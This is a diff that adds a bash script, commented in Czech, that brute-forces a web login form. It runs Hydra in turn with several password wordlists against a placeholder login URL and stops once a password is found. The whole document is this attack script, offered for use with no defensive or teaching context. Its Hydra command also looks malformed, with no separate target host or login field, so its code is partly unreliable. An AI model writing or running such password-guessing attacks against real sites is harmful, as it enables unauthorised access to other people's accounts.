@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# Seznam wordlistů, které chceme použít
+wordlists=(
+  "/cesta/k/wordlist1.txt"
+  "/cesta/k/wordlist2.txt"
+  "/cesta/k/wordlist3.txt"
+)
+
+# URL cílové stránky a chybová hláška
+url="http://target-website.com/login"
+error_msg="Neplatné heslo!"
+
+# Procházení wordlisty
+for wordlist in "${wordlists[@]}"; do
+  echo "Zkouším wordlist: $wordlist"
+  
+  # Spustí Hydra s aktuálním wordlistem
+  hydra -P "$wordlist" -s 80 -f -vV http-post-form "$url:password=^PASS^:$error_msg"
+  
+  # Zkontroluj, zda byl útok úspěšný
+  if [ $? -eq 0 ]; then
+    echo "Útok úspěšný s wordlistem $wordlist"
+    break
+  else
+    echo "Heslo nebylo nalezeno ve wordlistu $wordlist"
+  fi
+done
